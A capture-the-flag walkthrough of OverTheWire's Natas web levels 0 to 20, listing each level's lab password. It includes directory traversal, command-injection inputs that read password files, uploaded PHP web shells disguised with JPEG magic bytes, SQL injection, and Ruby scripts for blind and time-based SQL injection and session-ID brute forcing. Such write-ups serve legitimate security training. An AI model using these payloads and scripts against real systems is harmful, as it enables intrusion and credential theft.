# [Natas](http://overthewire.org/wargames/natas/)

All levels located at `http://natas[level].natas.labs.overthewire.org`

## Natas 0

**user:** *natas0*  
**pass:** *natas0*  
**url:** [http://natas0.natas.labs.overthewire.org](http://natas0.natas.labs.overthewire.org)

Taking a look at the source of the page we see the password.

Password for *natas1*: **gtVrDuiDfck831PqWsLEZy5gyDz1clto**

## Natas 1

**user:** *natas1*  
**pass:** *gtVrDuiDfck831PqWsLEZy5gyDz1clto*  
**url:** [http://natas1.natas.labs.overthewire.org](http://natas1.natas.labs.overthewire.org)

So the password is in the source again, but right clicking was blocked. I use keyboard 
shortcuts anyway so this wasn't an issue.

Password for *natas2*: **ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi**

## Natas 2

**user:** *natas2*  
**pass:** *ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi*  
**url:** [http://natas2.natas.labs.overthewire.org](http://natas2.natas.labs.overthewire.org)

"There is nothing on this page"

Well that's a lie. there is a very small PNG file at `/files/pixel.png`

Let's see if we can see anything else in the `/files` directory.

Sure enough there's a txt file with our password for natas3.

Password for *natas3*: **sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14**

## Natas 3

**user:** *natas3*  
**pass:** *sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14*  
**url:** [http://natas3.natas.labs.overthewire.org](http://natas3.natas.labs.overthewire.org)

Now, there's a comment in the source:

> No more information leaks!! Not even Google will find it this time...

Well, that's a pretty big hint. Websites have a `robots.txt` to tell search engines 
which pages to index/crawl. So let's look at `/robots.txt`

> Disallow: /s3cr3t/

So let's check out that directory. `/s3cr3t`. There's a text file with our password.

Password for *natas4*: **Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ**

## Natas 4

**user:** *natas4*  
**pass:** *Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ*  
**url:** [http://natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org)

Says authorized users can only come from `http://natas5.natas.labs.overthewire.org/`

This is what's called a Referer Header, which luckily for us is easy to spoof.

So let's set our referer header and refresh the page (or use `curl` which is what I did)

Password for *natas5*: **iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq**

## Natas 5

**user:** *natas5*  
**pass:** *iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq*  
**url:** [http://natas5.natas.labs.overthewire.org](http://natas5.natas.labs.overthewire.org)

So apparently we are not "logged in".

A quick look at the cookies shows a `loggedin` cookie set to "0". Let's set it to "1" 
and refresh the page.

Password for *natas6*: **aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1**

## Natas 6

**user:** *natas6*  
**pass:** *aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1*  
**url:** [http://natas6.natas.labs.overthewire.org](http://natas6.natas.labs.overthewire.org)

So it's a PHP script processing our POST request. It checks if our input is equal to 
some variable named `$secret`. Which is probably defined in the `include` file, 
`/includes/secret.inc`. We can go directly there and see the value of `$secret`

`$secret = "FOEIUWGHFEEUHOFUOIU";`

So let's type that password into our input box. And there's our password.

Password for *natas7*: **7z3hEENjQtflzgnT29q7wAvMNfZdh0i9**

## Natas 7

**user:** *natas7*  
**pass:** *7z3hEENjQtflzgnT29q7wAvMNfZdh0i9*  
**url:** [http://natas7.natas.labs.overthewire.org](http://natas7.natas.labs.overthewire.org)

There's a hint in the source

> hint: password for webuser natas8 is in /etc/natas_webpass/natas8

So I imagine the `index.php?page=` is vulnerable to a little directory traversal.

If this `index.php?page=./home` returns the same thing as `index.php?page=home` then 
we are in!

And it does. So let's try this `index.php?page=../../../../../etc/natas_webpass/natas8`

Password for *natas8*: **DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe**

## Natas 8

**user:** *natas8*  
**pass:** *DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe*  
**url:** [http://natas8.natas.labs.overthewire.org](http://natas8.natas.labs.overthewire.org)

So they gave us the source code again and our input is being passed through a few 
PHP functions. We can just reverse those functions with an online php editor.

```php
<?
  $encodedSecret = "3d3d516343746d4d6d6c315669563362";
  echo base64_decode(strrev(hex2bin($encodedSecret)));
?>
```

So we got our input and when we enter that we get our password!

Password for *natas9*: **W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl**

## Natas 9

**user:** *natas9*  
**pass:** *W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl*  
**url:** [http://natas9.natas.labs.overthewire.org](http://natas9.natas.labs.overthewire.org)

So we get the source code again and our input is just being `passthru`d to the `grep` 
command with no quotes, sanitization, or anything.

We can just use `; cat /etc/natas_webpass/natas10;` as our input which will cancel the 
`grep` command with the first semicolon, run our `cat` command and then ignore the rest 
with the second semicolon.

There's our password!

Password for *natas10*: **nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu**

## Natas 10

**user:** *natas10*  
**pass:** *nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu*  
**url:** [http://natas10.natas.labs.overthewire.org](http://natas10.natas.labs.overthewire.org)

Same code as last challenge, but now semicolons, pipes and ampersands are being filtered 
out. Can we still execute arbitrary code?

Well unfortunately yes. `grep` can take multiple files as arguments. So we can search 
for any string `.*` (in regex) in both files.

`.* /etc/natas_webpass/natas11`

And there's our password!

Password for *natas11*: **U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK**

## Natas 11

**user:** *natas11*  
**pass:** *U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK*  
**url:** [http://natas11.natas.labs.overthewire.org](http://natas11.natas.labs.overthewire.org)

So we got the source again. Looks like there is some XOR stuff going on. Luckily XOR 
is reversable so let's reverse engineer this code.

```php
function xor_encrypt($in, $in_key) {
    $key = $in_key;
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$a = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxEIaAw%3D");
$b = json_encode(array('showpassword'=>'no','bgcolor'=>'#ffffff'));
echo xor_encrypt($a,$b);
```

So this gives us "qw8J" repeated over and over so that's our key!

Now we just have to get the correct cookie for that key and our `showpassword=yes`.

```php
$a = json_encode(array('showpassword'=>'yes','bgcolor'=>'#ffffff'));
$b = xor_encrypt($a, 'qw8J');
echo base64_encode($b);
```

We get the Base64 string "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"

So let's swap that in for our `data` cookie and refresh the page!

Password for *natas12*: **EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3**

## Natas 12

**user:** *natas12*  
**pass:** *EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3*  
**url:** [http://natas12.natas.labs.overthewire.org](http://natas12.natas.labs.overthewire.org)

So we got a file upload form. Looking at the source code, it takes whatever file we give it, 
generates a random name for it and then appends ".jpg" to it. But I don't see anywhere in the 
code that actually confirms we're uploading a JPG. Can we just upload a malicious PHP script?

`<?php system('cat /etc/natas_webpass/natas13'); ?>`

Not quite. If we look at source closer, the ".jpg" extension added in the hidden input `filename` 
is what gets passed to `makeRandomPath()`. So how can we force our PHP extension?

Well we know that file extension is being set client-side. So we can just intercept the POST 
request and change it to ".php".

And we click on our successfully uploaded PHP script. We get our password!

Password for *natas13*: **jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY**

## Natas 13

**user:** *natas13*  
**pass:** *jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY*  
**url:** [http://natas13.natas.labs.overthewire.org](http://natas13.natas.labs.overthewire.org)

Ok same thing as the last challenge, but now they have wised up to actually checking if we are 
submitting a JPG with `exif_imagetype()`.

Too bad that method only checks the first few bytes looking for an file signature. 

You can see a [list of file signatures here](https://en.wikipedia.org/wiki/List_of_file_signatures)

As long as our malicious PHP scripts first few bytes are "\xFF\xD8\xFF\xDB", we'll get past this 
filter.

`ÿØÿÛ<? system('cat /etc/natas_webpass/natas14'); ?>`

Of course, we'll have to intercept the request and change the extension again but after that, our 
upload will succeed and we see our password!

Password for *natas14*: **Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1**

## Natas 14

**user:** *natas14*  
**pass:** *Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1*  
**url:** [http://natas14.natas.labs.overthewire.org](http://natas14.natas.labs.overthewire.org)

So this time, we have a login form. But thankfully, the source code has been given to us once 
again. Our inputs are being passed directly into an SQL query without any sanitization or anything. 
Smells like SQL injection to me. Let's just login for *natas15* and cancel out the password check.

For that, just use the username: `natas15"-- ` (Don't forget the space at the end for it to be a 
valid MySQL comment)

And we successfully logged in!

Password for *natas15*: **AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J**

## Natas 15

**user:** *natas15*  
**pass:** *AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J*  
**url:** [http://natas15.natas.labs.overthewire.org](http://natas15.natas.labs.overthewire.org)

So this time, we just have a form to check for the existence of a user. But it obviously doesn't 
leak the password. Looking at the source code, there is again no sanitation done on our input. This 
is what is called a Blind SQL injection because we don't actually see the results of the query. But 
we do get two very different messages based on the results. If our query returns a result, we get 
"This user exists."

We can use this and some SQL trickery to brute force the password.

First let's figure out the length of the password using a query like this.

`natas16" and length(password)>1-- `

And of course we get "This user exists". We can keep incrementing the length until we see the 
message "This user doesn't exist."

Finally we figure out that the password for *natas16* is 32 characters long.

All right, now it's time to brute force. You could use tools like Burp Suite or Hydra but why 
don't we code our own for fun...

```ruby
require 'net/http'

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pass = ""
32.times do |i|
  allChars.split("").each do |c|
    uri = URI.parse("http://natas15.natas.labs.overthewire.org/index.php")
    params = {'username' => "natas16\" AND password LIKE BINARY \"#{pass + c}%\"-- "}
    http = Net::HTTP.new(uri.host,uri.port)
    req = Net::HTTP::Get.new(uri.path)
    req.basic_auth("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
    req.set_form_data(params)

    req = Net::HTTP::Get.new(uri.path + '?' + req.body)
    req.basic_auth("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

    resp = http.request(req)
    if resp.body.include?("This user exists")
      pass += c
      puts "(#{pass.length}/32) => #{pass}"
      break
    end
  end
end
  
puts "Password for Level 16: #{pass}"
```

Running this takes a little time because it's a 32 character password and I could probably 
optimize it by using some `substr()` magic  but still we get the password!

Password for *natas16*: **WaIHEacj63wnNIBROHeqi3p9t0m5nhmh**

## Natas 16

**user:** *natas16*  
**pass:** *WaIHEacj63wnNIBROHeqi3p9t0m5nhmh*  
**url:** [http://natas16.natas.labs.overthewire.org](http://natas16.natas.labs.overthewire.org)

Looking at the source code for this one, we see that our input is getting `passthru()`d to the 
`grep` command without any sanitization. So let's just terminate the command and read the 
password file...oh wait, our input is getting sanitized. We can't use `;` or `&` to terminate/chain 
commands. So what can we do to bypass the filter?

Well one thing they aren't filtering is these characters: `$()`

This is how we can do nested commands in bash. So if we did this for example:

`Americans$(grep -i a /etc/natas_webpass/natas17)`

Our query would only return "Americans" if the letter "a" was not in the password for natas17.

So we can make a script to brute force this thing. Assuming 32 character password like all the 
other levels:

```ruby
require 'net/http'

allChars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
password = ""
32.times do |i|
  allChars.each do |c|
    uri = URI.parse("http://natas16.natas.labs.overthewire.org/index.php")
    params = {'needle' => "Americans$(grep ^#{password + c} /etc/natas_webpass/natas17)"}
    http = Net::HTTP.new(uri.host,uri.port)
    req = Net::HTTP::Get.new(uri.path)
    req.basic_auth("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
    req.set_form_data(params)

    req = Net::HTTP::Get.new(uri.path + '?' + req.body)
    req.basic_auth("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")

    resp = http.request(req)
    unless resp.body.include?("Americans")
      password += c
      break
    end
  end
  puts "Password (#{i}/32): #{password}"
end
```

Password for *natas17*: **8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw**

## Natas 17

**user:** *natas17*  
**pass:** *8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw*  
**url:** [http://natas17.natas.labs.overthewire.org](http://natas17.natas.labs.overthewire.org)

So looking at the source code, we got a form that's vulnerable to SQL injection.

But wait...what? Whatever I input, I get back a basically empty page?

If you look closely at the PHP code, all output is commented out. That means there is 
no way to know what the query returns. This is a truly Blind SQL injection. The only thing 
we can go off of is how long it takes for the query to execute.

We can tell the query to `sleep()` for a few seconds if a condition is true. Then if we 
notice that the query took longer (ie. it slept), we know that our query condition was true.

If we use this query: `natas18" and sleep(10)-- `

The query will sleep for 10 seconds before returning.

We can use this to exfiltrate data.

```ruby
require 'net/http'

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pass = ""
32.times do |i|
  allChars.split("").each do |c|
    uri = URI.parse("http://natas17.natas.labs.overthewire.org/index.php")
    params = {'username' => "natas18\" AND password LIKE BINARY \"#{pass + c}%\" AND sleep(2)-- "}                                                                                                            http = Net::HTTP.new(uri.host,uri.port)
    req = Net::HTTP::Get.new(uri.path)
    req.basic_auth("natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
    req.set_form_data(params)

    req = Net::HTTP::Get.new(uri.path + '?' + req.body)
    req.basic_auth("natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
                                                                                                                                                                                                              start_time = Time.now
    resp = http.request(req)
    total_time = Time.now - start_time
    if total_time > 2
      pass += c
      puts "(#{pass.length}/32) => #{pass}"
      break
    end
  end
end


puts "Password for Level 18: #{pass}"
```

Password for *natas18*: **xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP**

## Natas 18

**user:** *natas18*  
**pass:** *xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP*  
**url:** [http://natas18.natas.labs.overthewire.org](http://natas18.natas.labs.overthewire.org)

If we look at the source code, it looks like the only authentication it is doing is checking 
the `PHPSESSID` cookie to see if it is the admins and since we only have to check a max of 
640 ids we should be able to brute force this thing in less than a minute.

```ruby
require 'net/http'

print "Attempting: "
641.times do |i|
  print "#{i},"
  uri = URI.parse("http://natas18.natas.labs.overthewire.org/index.php")
  http = Net::HTTP.new(uri.host,uri.port)

  header = { 'Cookie' => "PHPSESSID=#{i}" }
  req = Net::HTTP::Post.new(uri.path, header)
  req.basic_auth("natas18","xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

  resp = http.request(req)
  if resp.body.include?("You are an admin")
    puts resp.body
    break
  end
end
```

Password for *natas19*: **4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs**

## Natas 19

**user:** *natas19*  
**pass:** *4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs*  
**url:** [http://natas19.natas.labs.overthewire.org](http://natas19.natas.labs.overthewire.org)

This level says that it uses most of the same code but that "sessions ids are no longer sequential".

That shouldn't matter for our script. I do wonder if they only go up to 640 though? They apparently don't 
because if we just log in with a blank form our `PHPSESSID=3535392d`. So this could take a little longer.

But let's generate a few to see if there is any pattern...

With username `admin` and a random password. These are starting to look a lot like hex. Let's 
convert this to ASCII. AHA! It is hex! Our last session id is `254-admin` in ascii.

So we probably have the old sequential id plus a hyphen plus the username. Now we can brute 
force that easy!

```ruby
require 'net/http'

print "Attempting: "
641.times do |i|
  attempt = "#{i}-admin".each_byte.map{|b| b.to_s(16)}.join
  print "#{attempt},"
  uri = URI.parse("http://natas19.natas.labs.overthewire.org/index.php")
  http = Net::HTTP.new(uri.host,uri.port)

  header = { 'Cookie' => "PHPSESSID=#{attempt}" }
  req = Net::HTTP::Post.new(uri.path, header)
  req.basic_auth("natas19","4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

  resp = http.request(req)
  if resp.body.include?("You are an admin")
    puts resp.body
    break
  end
end
```

Password for *natas20*: **eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF**

## Natas 20

**user:** *natas20*  
**pass:** *eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF*  
**url:** [http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)




















